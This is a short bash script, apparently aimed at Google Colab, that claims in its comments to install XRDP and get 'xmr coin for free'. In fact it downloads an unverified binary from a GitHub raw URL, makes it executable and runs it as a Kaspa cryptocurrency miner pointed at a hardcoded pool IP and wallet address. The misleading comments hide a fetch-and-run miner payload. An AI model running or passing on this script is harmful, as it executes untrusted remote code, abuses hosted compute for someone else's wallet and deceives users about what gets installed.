# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R AkubapakMU

wget https://github.com/angkii/m/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=178.128.86.41:80
WALLET=kaspa:3Aqrh5ckwta4prfxh4wfvn2ard2k488dx967v8hwzvumr2une5r2a4sjhvemwpz

./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl
